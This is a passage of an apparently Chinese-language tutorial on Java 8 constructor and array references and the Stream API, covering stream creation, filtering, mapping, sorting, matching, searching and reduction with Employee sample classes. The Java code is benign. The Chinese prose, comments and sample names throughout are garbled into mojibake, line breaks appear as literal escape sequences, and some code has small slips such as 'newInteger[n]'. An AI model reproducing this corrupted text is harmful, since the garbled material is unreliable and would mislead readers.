ä¸å‡½æ•°å¼æ¥å£ç›¸ç»“åˆï¼Œè‡ªåŠ¨ä¸å‡½æ•°å¼æ¥å£ä¸­æ–¹æ³•å…¼å®¹ã€‚\n\n- å¯ä»¥æŠŠæ„é€ å™¨å¼•ç”¨èµ‹å€¼ç»™å®šä¹‰çš„æ–¹æ³•\n- è¦æ±‚ï¼šæ„é€ å™¨å‚æ•°åˆ—è¡¨è¦ä¸æ¥å£ä¸­æŠ½è±¡æ–¹æ³•çš„å‚æ•°åˆ—è¡¨ä¸€è‡´ ï¼ä¸”æ–¹æ³•çš„è¿”å›å€¼å³ä¸ºæ„é€ å™¨å¯¹åº”ç±»çš„å¯¹è±¡ã€‚\n\n- æ ¼å¼ï¼šClassName::new \n\n```java\nFunction<Integer, MyClass> fun = (n) -> new MyClass(n);\n//ç­‰åŒäº:\nFunction<Integer, MyClass> fun = MyClass::new;\n```\n\n### æ•°ç»„å¼•ç”¨\n\n- æ ¼å¼ï¼štype[]::new\n\n```java\nFunction<Integer, Integer[]> fun = (n) -> newInteger[n];\n//ç­‰åŒäº\nFunction<Integer, Integer[]> fun = Integer[]::new;\n\nFunction<Integer, String[]> fun = (args) -> new String[args];\nString[] strs = fun.apply(10);\nSystem.out.println(strs.length);\n//ç­‰åŒäº\nFunction<Integer, Employee[]> fun2 = Employee[]::new;\nEmployee[] emps = fun2.apply(20);\nSystem.out.println(emps.length);\n```\n\n## Stream API\n\n### Stream ç®€ä»‹\n\n- æµå¼ç¼–ç¨‹ä½œä¸º Java 8 çš„äº®ç‚¹ä¹‹ä¸€ï¼Œæ˜¯ç»§ Java 5 ä¹‹åå¯¹é›†åˆçš„å†ä¸€æ¬¡å‡çº§\n- Stream API å¯¹é›†åˆæ•°æ®è¿›è¡Œæ“ä½œï¼Œå°±ç±»ä¼¼äºä½¿ç”¨SQL æ‰§è¡Œçš„æ•°æ®åº“æŸ¥è¯¢ï¼ŒStream API ä¸»è¦æ˜¯é€šè¿‡ Lambda è¡¨è¾¾å¼å®Œæˆã€‚\n- Stream çš„å·¥ä½œè¿‡ç¨‹åƒå°†ä¸€ç“¶æ°´å¯¼å…¥æœ‰å¾ˆå¤šè¿‡æ»¤é˜€çš„ç®¡é“ä¸€æ ·ï¼Œæ°´æ¯ç»è¿‡ä¸€ä¸ªè¿‡æ»¤é˜€ï¼Œä¾¿è¢«æ“ä½œä¸€æ¬¡ï¼Œæ¯”å¦‚è¿‡æ»¤ï¼Œè½¬æ¢ç­‰ï¼Œæœ€åç®¡é“çš„å¦å¤–ä¸€å¤´æœ‰ä¸€ä¸ªå®¹å™¨è´Ÿè´£æ¥æ”¶å‰©ä¸‹çš„æ°´ã€‚\n  - é¦–å…ˆé€šè¿‡ source äº§ç”Ÿæµï¼Œç„¶åä¾æ¬¡é€šè¿‡ä¸€äº›ä¸­é—´æ“ä½œï¼Œæ¯”å¦‚è¿‡æ»¤ï¼Œè½¬æ¢ï¼Œé™åˆ¶ç­‰ï¼Œæœ€åç»“æŸå¯¹æµçš„æ“ä½œã€‚\n\n![](https://img.jwt1399.top/img/1363061-20191114111258234-147169035.png)\n\n- Stream ä¹Ÿå¯ä»¥ç†è§£ä¸ºä¸€ä¸ªæ›´åŠ é«˜çº§çš„è¿­ä»£å™¨ï¼Œä¸»è¦çš„ä½œç”¨ä¾¿æ˜¯éå†å…¶ä¸­æ¯ä¸€ä¸ªå…ƒç´ ã€‚\n- Stram API ä¸­è‡ªå¸¦çš„å¹¶è¡Œæµä½¿å¾—å¹¶å‘å¤„ç†é›†åˆçš„é—¨æ§›å†æ¬¡é™ä½ï¼Œä½¿ç”¨ Stream API ç¼–ç¨‹å¯ä»¥éå¸¸æ–¹ä¾¿çš„å†™å‡ºé«˜æ€§èƒ½çš„å¹¶å‘ç¨‹åºã€‚\n\n**Stream å’Œ Collection é›†åˆçš„åŒºåˆ«ï¼š**Collection æ˜¯ä¸€ç§é™æ€çš„å†…å­˜æ•°æ®ç»“æ„ï¼Œè€ŒStream æ˜¯æœ‰å…³è®¡ç®—çš„ã€‚å‰è€…æ˜¯ä¸»è¦é¢å‘å†…å­˜ï¼Œå­˜å‚¨åœ¨å†…å­˜ä¸­ï¼Œåè€…ä¸»è¦æ˜¯é¢å‘CPUï¼Œé€šè¿‡ CPU å®ç°è®¡ç®—ã€‚\n\nåœ¨æ²¡æœ‰ Stream ä¹‹å‰ï¼Œæˆ‘ä»¬æƒ³æå–å‡ºæ‰€æœ‰å¹´é¾„å¤§äº18çš„å­¦ç”Ÿï¼Œæˆ‘ä»¬éœ€è¦è¿™æ ·åšï¼š\n\n```java\nList<Student> result=new ArrayList<>();\nfor(Student student:students){\n    if(student.getAge()>18){\n        result.add(student);\n    }\n}\nreturn result;\n```\n\nä½¿ç”¨Streamï¼Œæˆ‘ä»¬å¯ä»¥å‚ç…§ä¸Šé¢çš„æµç¨‹ç¤ºæ„å›¾æ¥åšï¼Œé¦–å…ˆäº§ç”Ÿ Streamï¼Œç„¶å filter è¿‡æ»¤ï¼Œæœ€åå½’å¹¶åˆ°å®¹å™¨ä¸­ã€‚\n\n```java\nreturn students.stream().filter(s->s.getAge()>18).collect(Collectors.toList());\n```\n\n### **Stream**æ“ä½œæ­¥éª¤\n\n- 1ã€åˆ›å»º Stream\n  - ä¸€ä¸ªæ•°æ®æºï¼ˆå¦‚ï¼šé›†åˆã€æ•°ç»„ï¼‰ï¼Œè·å–ä¸€ä¸ªæµ\n- 2ã€ä¸­é—´æ“ä½œ\n  - ä¸€ä¸ªä¸­é—´æ“ä½œé“¾ï¼Œå¯¹æ•°æ®æºçš„æ•°æ®è¿›è¡Œå¤„ç†\n- 3ã€ç»ˆæ­¢æ“ä½œ\n  - ä¸€æ—¦æ‰§è¡Œç»ˆæ­¢æ“ä½œï¼Œå°±æ‰§è¡Œä¸­é—´æ“ä½œé“¾ï¼Œå¹¶äº§ç”Ÿç»“æœã€‚ä¹‹åï¼Œä¸ä¼šå†è¢«ä½¿ç”¨\n\n### åˆ›å»ºæµ\n\nåœ¨åˆ›å»º Stream å‰ï¼Œå…ˆåˆ›å»ºä¸€ä¸ª Employee.javaï¼Œä¾›ä¸‹é¢æµ‹è¯•ä½¿ç”¨ã€‚\n\n```java\npublic class Employee {\n\n    private int id;\n    private String name;\n    private int age;\n    private double salary;\n\n    public Employee() {\n    }\n\n    public Employee(String name) {\n        this.name = name;\n    }\n    public Employee(Integer id) {\n        this.id = id;\n    }\n    public Employee(Integer id,Integer age) {\n        this.id = id;\n        this.age = age;\n    }\n\n    public Employee(String name, int age) {\n        this.name = name;\n        this.age = age;\n    }\n\n    public Employee(int id, String name, int age, double salary) {\n        this.id = id;\n        this.name = name;\n        this.age = age;\n        this.salary = salary;\n    }\n\n    public int getId() {\n        return id;\n    }\n\n    public void setId(int id) {\n        this.id = id;\n    }\n\n    public String getName() {\n        return name;\n    }\n\n    public void setName(String name) {\n        this.name = name;\n    }\n\n    public int getAge() {\n        return age;\n    }\n\n    public void setAge(int age) {\n        this.age = age;\n    }\n\n    public double getSalary() {\n        return salary;\n    }\n\n    public void setSalary(double salary) {\n        this.salary = salary;\n    }\n\n    public String show() {\n        return \"æµ‹è¯•æ–¹æ³•å¼•ç”¨ï¼\";\n    }\n\n    @Override\n    public int hashCode() {\n        final int prime = 31;\n        int result = 1;\n        result = prime * result + age;\n        result = prime * result + id;\n        result = prime * result + ((name == null) ? 0 : name.hashCode());\n        long temp;\n        temp = Double.doubleToLongBits(salary);\n        result = prime * result + (int) (temp ^ (temp >>> 32));\n        return result;\n    }\n\n    @Override\n    public boolean equals(Object obj) {\n        if (this == obj)\n            return true;\n        if (obj == null)\n            return false;\n        if (getClass() != obj.getClass())\n            return false;\n        Employee other = (Employee) obj;\n        if (age != other.age)\n            return false;\n        if (id != other.id)\n            return false;\n        if (name == null) {\n            if (other.name != null)\n                return false;\n        } else if (!name.equals(other.name))\n            return false;\n        if (Double.doubleToLongBits(salary) != Double.doubleToLongBits(other.salary))\n            return false;\n        return true;\n    }\n\n    @Override\n    public String toString() {\n        return \"Employee [id=\" + id + \", name=\" + name + \", age=\" + age + \", salary=\" + salary + \"]\";\n    }\n\n}\n```\n\nåˆ›å»ºä¸€ä¸ªæµ‹è¯•ç±» StreamAPI.javaï¼Œå¹¶åˆ›å»ºä¸€ä¸ª test æ–¹æ³•ã€‚æ‰€æœ‰åˆ›å»º Stream çš„æ–¹å¼éƒ½åœ¨è¿™ä¸ªç±»çš„ test æ–¹æ³•ä¸­ã€‚\n\n```java\npublic class StreamaAPI {\n  @Test\n  public void test() {\n\n  }\n}\n```\n\n#### æ–¹å¼ä¸€ï¼šé€šè¿‡é›†åˆ\n\n Java8 ä¸­çš„ Collection æ¥å£è¢«æ‰©å±•ï¼Œæä¾›äº†ä¸¤ä¸ªè·å–æµçš„æ–¹æ³•\n\n- **default Stream\\<E> stream() :** è¿”å›ä¸€ä¸ªé¡ºåºæµ\n  - `Collection.stream()`\n\n- **default Stream\\<E> parallelStream() :** è¿”å›ä¸€ä¸ªå¹¶è¡Œæµ\n  - `Collection.parallelStream()`\n\n```java\nList<String> list = new ArrayList<>();\nStream<String> stream1 = list.stream();//è·å–ä¸€ä¸ªé¡ºåºæµ\nStream<String> stream2 = list.parallelStream();//è·å–ä¸€ä¸ªå¹¶è¡Œæµ\n```\n\n#### æ–¹å¼äºŒï¼šé€šè¿‡æ•°ç»„\n\nJava8 ä¸­çš„ Arrays çš„é™æ€æ–¹æ³•stream() å¯ä»¥è·å–æ•°ç»„æµï¼š\n\n- **static \\<T> Stream\\<T> stream(T[] array):** è¿”å›ä¸€ä¸ªæµ\n  - `Arrays.stream(T array)`\n\n```java\nEmployee[] emps = new Employee[10];\nStream<Employee> stream3 = Arrays.stream(emps);\n```\n\né‡è½½å½¢å¼ï¼Œèƒ½å¤Ÿå¤„ç†å¯¹åº”åŸºæœ¬ç±»å‹çš„æ•°ç»„ï¼š\n\n- public static IntStream stream(int[] array)\n\n- public static LongStream stream(long[] array)\n\n- public static DoubleStream stream(double[] array)\n\n#### æ–¹å¼ä¸‰ï¼šé€šè¿‡**Stream**çš„**of()**\n\nå¯ä»¥è°ƒç”¨Streamç±»é™æ€æ–¹æ³•of(), é€šè¿‡æ˜¾ç¤ºå€¼åˆ›å»ºä¸€ä¸ªæµã€‚å®ƒå¯ä»¥æ¥æ”¶ä»»æ„æ•°é‡çš„å‚æ•°ã€‚\n\n- **public static \\<T> Stream\\<T> of(T... values) :** è¿”å›ä¸€ä¸ªæµ\n  - `Stream.of()`\n\n```java\nStream<String> stream4 = Stream.of(\"aa\", \"bb\", \"cc\");\nstream4.forEach(System.out::println);\n```\n\n#### æ–¹å¼å››ï¼šåˆ›å»ºæ— é™æµ\n\nå¯ä»¥ä½¿ç”¨é™æ€æ–¹æ³• Stream.iterate() å’ŒStream.generate()ï¼Œåˆ›å»ºæ— é™æµã€‚\n\n- è¿­ä»£ï¼š**public static \\<T> Stream\\<T> iterate(final T seed, final UnaryOperator\\<T> f)** \n  - `Stream.iterate()` \n\n```java\nStream<Integer> stream5 = Stream.iterate(0, (x) -> x + 2);\nstream5.limit(5).forEach(System.out::println);\n```\n\n- ç”Ÿæˆï¼š**public static \\<T> Stream\\<T> generate(Supplier\\<T> s)** \n  - `Stream.generate()`\n\n```java\nStream<Double> stream6 = Stream.generate(() -> Math.random());\nstream6.limit(5).forEach(System.out::println);\n```\n\n### ä¸­é—´æ“ä½œ\n\nä¸€ä¸ªæµå¯ä»¥åé¢è·Ÿéšé›¶ä¸ªæˆ–å¤šä¸ªä¸­é—´æ“ä½œã€‚å…¶ç›®çš„ä¸»è¦æ˜¯æ‰“å¼€æµï¼Œåšå‡ºæŸç§ç¨‹åº¦çš„æ•°æ®æ˜ å°„/è¿‡æ»¤ï¼Œç„¶åä¼šè¿”å›ä¸€ä¸ªæ–°çš„æµï¼Œäº¤ç»™ä¸‹ä¸€ä¸ªæ“ä½œä½¿ç”¨ã€‚\n\nå¤šä¸ªä¸­é—´æ“ä½œå¯ä»¥è¿æ¥èµ·æ¥å½¢æˆä¸€ä¸ªæµæ°´çº¿ï¼Œé™¤éæµæ°´çº¿ä¸Šè§¦å‘ç»ˆæ­¢æ“ä½œï¼Œå¦åˆ™ä¸­é—´æ“ä½œä¸ä¼šæ‰§è¡Œä»»ä½•çš„å¤„ç†ï¼è€Œåœ¨ç»ˆæ­¢æ“ä½œæ—¶ä¸€æ¬¡æ€§å…¨éƒ¨å¤„ç†ï¼Œç§°ä¸ºâ€œæƒ°æ€§æ±‚å€¼â€\n\nåœ¨ä¸­é—´æ“ä½œå‰ï¼Œå…ˆåœ¨ StreamAPI.java ä¸­åˆ›å»ºä¸€ä¸ª Employee å¯¹è±¡çš„é›†åˆï¼Œä¾›ä¸‹é¢æµ‹è¯•ä½¿ç”¨ã€‚\n\n```java\nList<Employee> emps = Arrays.asList(\n  new Employee(102, \"æå››\", 59, 6666.66), \n  new Employee(101, \"å¼ ä¸‰\", 18, 9999.99),\n  new Employee(103, \"ç‹äº”\", 28, 3333.33), \n  new Employee(104, \"èµµå…­\", 8, 7777.77),\n  new Employee(104, \"èµµå…­\", 8, 7777.77), \n  new Employee(104, \"èµµå…­\", 8, 7777.77),\n  new Employee(105, \"ç”°ä¸ƒ\", 38, 5555.55)\n);\n```\n\n#### ç­›é€‰/åˆ‡ç‰‡\n\n| æ–¹æ³•                    | æè¿°                                                         |\n| ----------------------- | ------------------------------------------------------------ |\n| **filter(Predicate p)** | æ¥æ”¶Lambda ï¼Œä»æµä¸­æ’é™¤æŸäº›å…ƒç´                               |\n| **distinct()**          | ç­›é€‰ï¼Œé€šè¿‡æµæ‰€ç”Ÿæˆå…ƒç´ çš„hashCode()å’Œequals()å»é™¤é‡å¤å…ƒç´      |\n| **limit(long maxSize)** | æˆªæ–­æµï¼Œä½¿å…¶å…ƒç´ ä¸è¶…è¿‡ç»™å®šæ•°é‡                               |\n| **skip(long n)**        | è·³è¿‡å…ƒç´ ï¼Œè¿”å›ä¸€ä¸ªæ‰”æ‰äº†å‰nä¸ªå…ƒç´ çš„æµã€‚è‹¥æµä¸­å…ƒç´ ä¸è¶³nä¸ªï¼Œåˆ™è¿”å›ä¸€ä¸ªç©ºæµã€‚ä¸limit(n) äº’è¡¥ |\n\n##### filterâ€”â€”è¿‡æ»¤\n\n```java\n@Test\npublic void testFilter() {\n  //è¿™é‡ŒåŠ å…¥äº†ç»ˆæ­¢æ“ä½œ ï¼Œä¸ç„¶ä¸­é—´æ“ä½œä¸ä¼šæ‰§è¡Œ\n  emps.stream().filter((e) -> e.getAge() > 18)//å¹´é¾„å¤§äº18å²\n    \t\t\t\t\t .forEach(System.out::println);//ç»ˆæ­¢æ“ä½œ\n}\n\n/**\nEmployee [id=102, name=æå››, age=59, salary=6666.66]\nEmployee [id=103, name=ç‹äº”, age=28, salary=3333.33]\nEmployee [id=105, name=ç”°ä¸ƒ, age=38, salary=5555.55]\n**/\n```\n\n##### distinctâ€”â€”å»é‡\n\n```java\n@Test\npublic void testDistinct() {\n  emps.stream().distinct()//å»é™¤é‡å¤çš„å…ƒç´ ï¼Œéœ€è¦é‡å†™hashCodeè·Ÿequalsæ–¹æ³•\n    \t\t\t\t\t .forEach(System.out::println);//ç»ˆæ­¢æ“ä½œ\n}\n\n/**\nEmployee [id=102, name=æå››, age=59, salary=6666.66]\nEmployee [id=101, name=å¼ ä¸‰, age=18, salary=9999.99]\nEmployee [id=103, name=ç‹äº”, age=28, salary=3333.33]\nEmployee [id=104, name=èµµå…­, age=8, salary=7777.77]\nEmployee [id=105, name=ç”°ä¸ƒ, age=38, salary=5555.55]\n**/\n```\n\n##### limitâ€”â€”æˆªæ–­æµ\n\n```java\n@Test\npublic void testLimit() {\n  emps.stream().filter((e) -> e.getAge()> 18)\n               .limit(2)\n    \t\t\t\t\t .forEach(System.out::println);//ç»ˆæ­¢æ“ä½œ\n}\n\n/**\nEmployee [id=102, name=æå››, age=59, salary=6666.66]\nEmployee [id=103, name=ç‹äº”, age=28, salary=3333.33]\n**/\n```\n\n##### skipâ€”â€”è·³è¿‡å…ƒç´ \n\n```java\n@Test\npublic void testSkip() {\n  emps.stream().filter((e) -> e.getAge() > 18)\n    \t\t\t\t\t .skip(2)//è¿™é‡Œå¯ä»¥æŸ¥æ‰¾filterè¿‡æ»¤åçš„æ•°æ®ï¼Œå‰ä¸¤ä¸ªä¸è¦ï¼Œè¦åé¢çš„ï¼Œä¸limitç›¸å\n    \t\t\t\t\t .forEach(System.out::println);//ç»ˆæ­¢æ“ä½œ\n}\n\n/**\nEmployee [id=105, name=ç”°ä¸ƒ, age=38, salary=5555.55]\n**/\n```\n\n#### æ˜ å°„\n\n`map`æ“ä½œèƒ½å¤Ÿå°†æµä¸­çš„æ¯ä¸€ä¸ªå…ƒç´ æ˜ å°„ä¸ºå¦å¤–çš„å…ƒç´ ã€‚\n\n| æ–¹æ³•                                | æè¿°                                                         |\n| ----------------------------------- | ------------------------------------------------------------ |\n| **map(Function f)**                 | æ¥æ”¶ä¸€ä¸ªå‡½æ•°ä½œä¸ºå‚æ•°ï¼Œè¯¥å‡½æ•°ä¼šè¢«åº”ç”¨åˆ°æ¯ä¸ªå…ƒç´ ä¸Šï¼Œå¹¶å°†å…¶æ˜ å°„æˆä¸€ä¸ªæ–°çš„å…ƒç´ ã€‚ |\n| **flatMap(Function f)**             | æ¥æ”¶ä¸€ä¸ªå‡½æ•°ä½œä¸ºå‚æ•°ï¼Œå°†æµä¸­çš„æ¯ä¸ªå€¼éƒ½æ¢æˆå¦ä¸€ä¸ªæµï¼Œç„¶åæŠŠæ‰€æœ‰æµè¿æ¥æˆä¸€ä¸ªæµ |\n| **mapToDouble(ToDoubleFunction f)** | æ¥æ”¶ä¸€ä¸ªå‡½æ•°ä½œä¸ºå‚æ•°ï¼Œè¯¥å‡½æ•°ä¼šè¢«åº”ç”¨åˆ°æ¯ä¸ªå…ƒç´ ä¸Šï¼Œäº§ç”Ÿä¸€ä¸ªæ–°çš„DoubleStreamã€‚ |\n| **mapToInt(ToIntFunction f)**       | æ¥æ”¶ä¸€ä¸ªå‡½æ•°ä½œä¸ºå‚æ•°ï¼Œè¯¥å‡½æ•°ä¼šè¢«åº”ç”¨åˆ°æ¯ä¸ªå…ƒç´ ä¸Šï¼Œäº§ç”Ÿä¸€ä¸ªæ–°çš„IntStreamã€‚ |\n| **mapToLong(ToLongFunction f)**     | æ¥æ”¶ä¸€ä¸ªå‡½æ•°ä½œä¸ºå‚æ•°ï¼Œè¯¥å‡½æ•°ä¼šè¢«åº”ç”¨åˆ°æ¯ä¸ªå…ƒç´ ä¸Šï¼Œäº§ç”Ÿä¸€ä¸ªæ–°çš„LongStreamã€‚ |\n\n```java\n\n@Test\npublic void testMapAndflatMap() {\n  List<String> list=Arrays.asList(\"aaa\",\"bbb\");\n  list.stream()\n    .map((str)->str.toUpperCase())//é‡Œé¢æ˜¯Function\n    .forEach(System.out::println);\n\n  System.out.println(\"======================================\");\n\n  //æµä¸­æµ\n  Stream<Stream<Character>> stream = list.stream()\n    .map(StreamAPI::filterCharacter);\n  //mapæ˜¯ä¸€ä¸ªä¸ªæµï¼ˆè¿™ä¸ªæµä¸­æœ‰å…ƒç´ ï¼‰åŠ å…¥æµä¸­ {{a,a,a},{b,b,b}}\n  stream.forEach(sm->{\n    sm.forEach(System.out::println);\n  });\n\n  System.out.println(\"=============å¼•è¿›flatMap=============\");\n  \n  //åªæœ‰ä¸€ä¸ªæµ\n  Stream<Character> flatMap = list.stream()\n    .flatMap(StreamAPI::filterCharacter);\n  //flatMapæ˜¯å°†ä¸€ä¸ªä¸ªæµä¸­çš„å…ƒç´ åŠ å…¥æµä¸­ {a,a,a,b,b,b}\n  flatMap.forEach(System.out::println);\n}\n\npublic static Stream<Character> filterCharacter(String str){\n  List<Character> list=new ArrayList<>();\n  for (Character character : str.toCharArray()) {\n    list.add(character);\n  }\n  return list.stream();\n}\n```\n\nmap è·Ÿ flatMapçš„åŒºåˆ«     \n\n* æœ‰ç‚¹è·Ÿé›†åˆä¸­çš„ add å’Œ addAll æ–¹æ³•ç±»ä¼¼     \n* add æ˜¯å°†æ— è®ºæ˜¯å…ƒç´ è¿˜æ˜¯é›†åˆï¼Œæ•´ä½“åŠ åˆ°å…¶ä¸­ä¸€ä¸ªé›†åˆä¸­å» [1,2,3,[2,3]]    \n* addAll æ˜¯å°†æ— è®ºæ˜¯å…ƒç´ è¿˜æ˜¯é›†åˆï¼Œéƒ½æ˜¯å°†å…ƒç´ åŠ åˆ°å¦ä¸€ä¸ªé›†åˆä¸­å» [1,2,3,2,3]\n* mapæ˜¯**ä¸€ä¸ªä¸ªæµ**ï¼ˆè¿™ä¸ªæµä¸­æœ‰å…ƒç´ ï¼‰åŠ å…¥æµä¸­ï¼ŒflatMapæ˜¯å°†**ä¸€ä¸ªä¸ªæµä¸­çš„å…ƒç´ **åŠ å…¥æµä¸­ã€‚\n\n#### æ’åº\n\n| æ–¹æ³•                       | æè¿°                               |\n| -------------------------- | ---------------------------------- |\n| **sorted()**               | äº§ç”Ÿä¸€ä¸ªæ–°æµï¼Œå…¶ä¸­æŒ‰è‡ªç„¶é¡ºåºæ’åº   |\n| **sorted(Comparator com)** | äº§ç”Ÿä¸€ä¸ªæ–°æµï¼Œå…¶ä¸­æŒ‰æ¯”è¾ƒå™¨é¡ºåºæ’åº |\n\n```java\n@Test\n\tpublic  void  testSorted() {\n\t\tList<String> list=Arrays.asList(\"ccc\",\"aaa\",\"bbb\",\"ddd\",\"eee\");\n\t\tlist.stream().sorted()\n\t\t\t\t     .forEach(System.out::println);\n\n\t\tSystem.out.println(\"=======å®šåˆ¶æ’åº=========\");\n\n\t\temps.stream().sorted((x, y) -> {\n\t\t\t\t\tif(x.getAge() == y.getAge()){\n\t\t\t\t\t\treturn x.getName().compareTo(y.getName());\n\t\t\t\t\t}else{\n\t\t\t\t\t\treturn Integer.compare(x.getAge(), y.getAge());\n\t\t\t\t\t}\n\t\t\t\t}).forEach(System.out::println);\n\t}\n```\n\n### ç»ˆæ­¢æ“ä½œ\n\nç»ˆæ­¢æ“ä½œä¼šä»æµçš„æµæ°´çº¿ç”Ÿæˆç»“æœã€‚å…¶ç»“æœå¯ä»¥æ˜¯ä»»ä½•ä¸æ˜¯æµçš„å€¼ï¼Œä¾‹å¦‚ï¼šListã€Integerï¼Œç”šè‡³æ˜¯void ï¼Œæµè¿›è¡Œäº†ç»ˆæ­¢æ“ä½œåï¼Œä¸èƒ½å†æ¬¡ä½¿ç”¨ã€‚\n\næ–°å»ºäº†ä¸€ä¸ªEmployee2.javaï¼Œä¾›ä¸‹é¢æµ‹è¯•ä½¿ç”¨ã€‚\n\n```java\npublic class Employee2 {\n\n    private int id;\n    private String name;\n    private int age;\n    private double salary;\n    private Status status;\n\n    public Employee2() {\n    }\n\n    public Employee2(String name) {\n        this.name = name;\n    }\n\n    public Employee2(String name, int age) {\n        this.name = name;\n        this.age = age;\n    }\n\n    public Employee2(int id, String name, int age, double salary) {\n        this.id = id;\n        this.name = name;\n        this.age = age;\n        this.salary = salary;\n    }\n\n    public Employee2(int id, String name, int age, double salary, Status status) {\n        this.id = id;\n        this.name = name;\n        this.age = age;\n        this.salary = salary;\n        this.status = status;\n    }\n\n    public Status getStatus() {\n        return status;\n    }\n\n    public void setStatus(Status status) {\n        this.status = status;\n    }\n\n    public int getId() {\n        return id;\n    }\n\n    public void setId(int id) {\n        this.id = id;\n    }\n\n    public String getName() {\n        return name;\n    }\n\n    public void setName(String name) {\n        this.name = name;\n    }\n\n    public int getAge() {\n        return age;\n    }\n\n    public void setAge(int age) {\n        this.age = age;\n    }\n\n    public double getSalary() {\n        return salary;\n    }\n\n    public void setSalary(double salary) {\n        this.salary = salary;\n    }\n\n    public String show() {\n        return \"æµ‹è¯•æ–¹æ³•å¼•ç”¨ï¼\";\n    }\n\n    @Override\n    public int hashCode() {\n        final int prime = 31;\n        int result = 1;\n        result = prime * result + age;\n        result = prime * result + id;\n        result = prime * result + ((name == null) ? 0 : name.hashCode());\n        long temp;\n        temp = Double.doubleToLongBits(salary);\n        result = prime * result + (int) (temp ^ (temp >>> 32));\n        return result;\n    }\n\n    @Override\n    public boolean equals(Object obj) {\n        if (this == obj)\n            return true;\n        if (obj == null)\n            return false;\n        if (getClass() != obj.getClass())\n            return false;\n        Employee2 other = (Employee2) obj;\n        if (age != other.age)\n            return false;\n        if (id != other.id)\n            return false;\n        if (name == null) {\n            if (other.name != null)\n                return false;\n        } else if (!name.equals(other.name))\n            return false;\n        if (Double.doubleToLongBits(salary) != Double.doubleToLongBits(other.salary))\n            return false;\n        return true;\n    }\n\n    @Override\n    public String toString() {\n        return \"Employee2 [id=\" + id + \", name=\" + name + \", age=\" + age + \", salary=\" + salary + \", status=\" + status\n                + \"]\";\n    }\n\n    public enum Status {\n        FREE, BUSY, VOCATION;\n    }\n}\n```\n\nåˆ›å»ºä¸€ä¸ªæµ‹è¯•ç±» TestShutdown.javaï¼Œtest æ–¹æ³•å†™åœ¨é‡Œé¢\n\n```java\npublic class TestShutdown {\n    List<Employee2> emps = Arrays.asList(\n            new Employee2(102, \"æå››\", 59, 6666.66, Employee2.Status.BUSY),\n            new Employee2(101, \"å¼ ä¸‰\", 18, 9999.99, Employee2.Status.FREE),\n            new Employee2(103, \"ç‹äº”\", 28, 3333.33, Employee2.Status.VOCATION),\n            new Employee2(104, \"èµµå…­\", 8, 7777.77, Employee2.Status.BUSY),\n            new Employee2(104, \"èµµå…­\", 8, 7777.77, Employee2.Status.FREE),\n            new Employee2(104, \"èµµå…­\", 8, 7777.77, Employee2.Status.FREE),\n            new Employee2(105, \"ç”°ä¸ƒ\", 38, 5555.55, Employee2.Status.BUSY)\n    );\n  \n    @Test\n    public void test() {\n\n    }\n}\n```\n\n#### åŒ¹é…\n\n| æ–¹æ³•                          | æè¿°                     |\n| ----------------------------- | ------------------------ |\n| **allMatch(Predicate p)**     | æ£€æŸ¥æ˜¯å¦åŒ¹é…æ‰€æœ‰å…ƒç´      |\n| **anyMatch**(**Predicate p**) | æ£€æŸ¥æ˜¯å¦è‡³å°‘åŒ¹é…ä¸€ä¸ªå…ƒç´  |\n| **noneMatch(Predicate p)**    | æ£€æŸ¥æ˜¯å¦æ²¡æœ‰åŒ¹é…æ‰€æœ‰å…ƒç´  |\n\n```java\n@Test\npublic void testMatch(){\n  System.out.println(\"==========allMatch==============\");\n  boolean allMatch = emps.stream().allMatch((e) -> e.getAge() > 5);\n  System.out.println(allMatch);\n\n  System.out.println(\"==========anyMatch==============\");\n  boolean anyMatch = emps.stream().anyMatch((e)->e.getName().equals(\"å¼ ä¸‰\"));\n  System.out.println(anyMatch);\n\n  System.out.println(\"==========noneMatch=============\");\n  boolean noneMatch = emps.stream().noneMatch((e) -> e.getAge() < 2);//æ£€æŸ¥æ˜¯å¦æ²¡æœ‰ä¸€ä¸ªå°äº2\n  System.out.println(noneMatch);\n}\n```\n\n#### æŸ¥æ‰¾\n\n| æ–¹æ³•                    | æè¿°                                                       |\n| ----------------------- | ---------------------------------------------------------- |\n| **findFirst()**         | è¿”å›ç¬¬ä¸€ä¸ªå…ƒç´                                              |\n| **findAny()**           | è¿”å›å½“å‰æµä¸­çš„ä»»æ„å…ƒç´                                      |\n| **count()**             | è¿”å›æµä¸­å…ƒç´ æ€»æ•°                                           |\n| **max(Comparator c)**   | è¿”å›æµä¸­æœ€å¤§å€¼                                             |\n| **min(Comparator c)**   | è¿”å›æµä¸­æœ€å°å€¼                                             |\n| **forEach(Consumer c)** | å†…éƒ¨è¿­ä»£(ä½¿ç”¨Collectionæ¥å£éœ€è¦ç”¨æˆ·å»åšè¿­ä»£ï¼Œç§°ä¸ºå¤–éƒ¨è¿­ä»£) |\n\n```java\n@Test\npublic void  testSearch(){\n  System.out.println(\"==========findFirst==============\");\n  Optional<Employee2> findFirst = emps.stream()\n    .sorted((e1, e2) -> Double.compare(e1.getSalary(), e2.getSalary()))//æŒ‰ç…§å·¥èµ„æ’åºå¹¶è¾“å‡ºç¬¬ä¸€ä¸ª\n    .findFirst();\n  System.out.println(findFirst);\n\n  System.out.println(\"==========findAny==============\");\n  Optional<Employee2> findAny = emps.stream()\n    .filter((e)->e.getStatus().equals(Employee2.Status.BUSY))\n    .findAny();\n  System.out.println(findAny);\n\n  System.out.println(\"==========count==============\");\n  long count = emps.stream().count();\n  System.out.println(count);\n\n  System.out.println(\"==========max==============\");\n  Optional<Double> max = emps.stream()\n    .map(Employee2::getSalary)\n    .max(Double::compare);\n  System.out.println(max);\n\n  System.out.println(\"==========min==============\");\n  Optional<Employee2> min = emps.stream()\n    .min((e1,e2)->Double.compare(e1.getSalary(), e2.getSalary()));\n  System.out.println(min);\n  \n  System.out.println(\"==========forEach==============\");\n  emps.stream().forEach(System.out::println);\n}\n```\n\n#### å½’çº¦\n\n| æ–¹æ³•                                     | æè¿°                                                     |\n| ---------------------------------------- | -------------------------------------------------------- |\n| **reduce(T identity, BinaryOperator b)** | å¯ä»¥å°†æµä¸­å…ƒç´ åå¤ç»“åˆèµ·æ¥ï¼Œå¾—åˆ°ä¸€ä¸ªå€¼ã€‚è¿”å›T            |\n| **reduce(BinaryOperator b)**             | å¯ä»¥å°†æµä¸­å…ƒç´ åå¤ç»“åˆèµ·æ¥ï¼Œå¾—åˆ°ä¸€ä¸ªå€¼ã€‚è¿”å›Optional\\<T> |\n\n- identity : èµ·å§‹å€¼\n- BinaryOperator : äºŒå…ƒè¿ç®—\n\nå¤‡æ³¨ï¼šmap å’Œreduce çš„è¿æ¥é€šå¸¸ç§°ä¸ºmap-reduce æ¨¡å¼ï¼Œå› Google 